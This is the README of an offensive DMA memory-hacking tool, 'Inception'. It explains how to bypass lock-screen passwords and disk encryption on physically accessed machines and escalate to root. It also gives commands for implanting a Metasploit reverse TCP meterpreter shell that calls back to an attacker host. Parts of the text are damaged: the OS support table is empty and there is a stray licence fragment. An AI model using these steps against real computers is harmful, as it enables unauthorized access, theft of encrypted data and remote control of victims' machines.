INCEPTION
=========

Inception is a physical memory manipulation and hacking tool exploiting 
PCI-based DMA. The tool can attack over FireWire, Thunderbolt, ExpressCard, PC
Card and any other PCI/PCIe HW interfaces.

Inception aims to provide a *relatively* quick, stable and easy way of performing
intrusive and non-intrusive memory hacks against live computers using DMA.

### How it works

Inception’s modules work as follows: By presenting a Serial Bus Protocol 2
(SBP-2) unit directory to the victim machine over a IEEE1394 FireWire
interface, the victim operating system thinks that a SBP-2 device has connected
to the FireWire port. Since SBP-2 devices utilize Direct Memory Access (DMA)
for fast, large bulk data transfers (e.g., FireWire hard drives and digital
camcorders), the victim lowers its shields and enables DMA for the device. The
tool now has full read/write access to the lower 4GB of RAM on the victim.

Once DMA is granted, the tool proceeds to search through available memory pages
for signatures at certain offsets in the operating system’s code. Once found,
the tool manipulates this code. For instance, in the unlock module, the tool
short circuits the operating system’s password authentication module that is
triggered if an incorrect password is entered.

*After running that module you should be able to log into the victim machine 
using any password.*

An analogy for this operation is planting an idea into the memory of the
machine; the idea that every password is correct. In other words, the 
equivalent of a [memory inception] [1].

Inception is free as in beer and a side project of mine. 


### Awesome! But why?

The world's forensics experts, governments and three-letter acronym agencies
are using [similar tools] [2] already. So if you are a dissident or facing 
an opressive regime, this tool illustrates why OPSEC is important. Never 
leave your laptop out of sight.


### Caveats

[OS X > 10.7.2] [6] and [Windows > 8.1] [7] disables FireWire DMA when the 
user has locked the OS and thus prevents inception. The tool will still work 
while a user is logged on. However, this is a less probable attack scenario IRL.

In addition, [OS X Mavericks > 10.8.2 on Ivy Bridge (>= 2012 Macs)] [8] have 
enabled VT-D, effectively blocking DMA requests and thwarting all inception 
modules even when the user is logged in. Look for `vtd[0] fault` entries in 
your log/console.

Even though these two caveats gradually will reduce the number of scenarios 
where this tool is useful, as of March 2015 [70 % of machines out there are 
still vulnerable] [9].

Witherden under a LGPL license.


Requirements
------------

Inception requires:

 * Hardware:
   * Attacker machine: Linux or Mac OS X (host / attacker machine) with a
     FireWire interface, either through a native FireWire port, an 
     ExpressCard/PCMCIA expansion port or a Thunderbolt to FireWire adapter.
   * Victim machine: A FireWire or Thunderbolt interface, or an
     ExpressCard/PCMCIA expansion port

Linux is currently recommended on the attacker side due to buggy firewire 
interfaces on OS X. Note that direct ThunderBolt to ThunderBolt does *not*
work, you need a FireWire adapter. Your mileage may vary when attempting
to use Thunderbolt on Linux.

 * Software:
   * [Python 3](https://www.scaler.com/topics/python/install-python-on-linux/)
   * git
   * gcc (incl. g++)
   * cmake
   * pip (for automatic resolution of dependencies)
   * [libforensic1394] [3]
   * msgpack


Installation
------------

On Debian-based distributions the installation commands can be summarized
as (apply `sudo` as needed if you're not root):

    apt-get install git cmake g++ python3 python3-pip

On OS X, you can install the tool requirements with [homebrew] [4]:

    brew install git cmake python3

After installing the requirements, download and install libforensic1394:

    wget https://freddie.witherden.org/tools/libforensic1394/releases/libforensic1394-0.2.tar.gz -O - | tar xz
    cd libforensic1394-0.2
    cmake CMakeLists.txt
    make install
    cd python
    python3 setup.py install

### Download and install Inception

    git clone git://github.com/carmaa/inception.git
    cd inception
    ./setup.py install

The setup script should be able to install dependencies if you have `pip`
installed.


General usage
-------------

 1. Connect the attacker machine (host) and the victim (target) with a FireWire
    cable
 2. Run Inception

Simply type:

    incept [module name]

For a more complete and up-to-date description, please run:

    incept -h

or see the [tool home page] [5].


Modules
-------

As of version 0.4.0, Inception has been modularized. The current modules, and
their functionality is described below.

For detailed options on usage, run:

    incept [module name] -h


### Unlock

The `unlock` module can unlock (any password accepted) and escalate privileges
to Administrator/root on almost* any powered on machine you have physical
access to. The module is primarily attended to do its magic against
computers that utilize full disk encryption such as BitLocker, FileVault,
TrueCrypt or Pointsec. There are plenty of other (and better) ways to hack a
machine that doesn't pack encryption. 

The unlock module is stable on machines that has 4 GiB of main memory or less.
If your the target has more then that, you need to be lucky in order to find
the signatures mapped to a physical memory page frame that the tool can reach.

As of this version, it is able to unlock the following x86 and x64 operating
systems:

|OS           |Version        |Unlock lock screen|Escalate privileges|

(1): See caveats above.

Other Linux distributions that use PAM-based authentication may also work 
using the Ubuntu signatures.

The module also effectively enables escalation of privileges, for instance via
the `runas` or `sudo -s` commands, respectively.

### Implant

The `implant` module implants a (memory-only) Metasploit payload
directly to the volatile memory of the target machine. It integrates with MSF
through the `msfrpcd` daemon that is included in all versions of Metasploit.

The current version only work as a proof-of-concept against Windows 7 SP1 x86.
No other OSes, versions or architectures are supported, nor is there any
guarantee that they will be supported in the future.

#### Execution

To use it, start `msfrpcd`:

    msfrpcd -P [password]

Then launch inception in another terminal:

    incept implant --msfpw [password] --msfopts [options]

As an example, to create a reverse TCP meterpreter shell from the target
machine to your attacking host, first start the `msfrpcd` dameon, and then
launch a console listening for callbacks. 

    msfrpcd -P password
    msfconsole

In the console, we configure the receiving end of the payload. We're setting
the `EXITFUNC` option to `thread` to ensure that the target process stays alive
if something should go awry:

    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 172.16.1.1
    set EXITFUNC thread
    set ExitOnSession false
    exploit -j

Then, in another terminal, we launch Inception:

    incept implant --msfpw password --msfopts LHOST=172.16.1.1

Disclaimer

Do no evil with this tool. Also, I am a pentester, not a developer. So if you
see weird code that bugs your pythonesque purity senses, drop me a note on how
I can improve it. Or even better, fork my code, change it and issue a pull
request.
